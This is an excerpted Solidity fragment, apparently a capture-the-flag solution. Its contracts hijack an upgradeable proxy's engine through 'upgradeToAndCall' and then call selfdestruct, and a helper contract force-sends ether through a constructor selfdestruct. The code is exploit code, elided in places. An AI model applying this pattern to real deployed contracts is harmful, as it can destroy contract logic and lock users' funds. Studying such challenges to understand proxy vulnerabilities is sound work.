...
contract hack {
    address immutable my;
    IEngine public engine;

    constructor (address _target) public {
        engine = IEngine(_target);
        my = address(this);
    }
...
engine.upgradeToAndCall(my, data);
    }

    function returnAdrees() public view returns (address) {
        return address(my);
    }

    function destroy() external    {
selfdestruct (payable (address(my)));
    }
...
contract selfdestructTester {
    ...
    constructor(address _target) public payable  {
        ...
        selfdestruct (payable (address(_target)));
    }
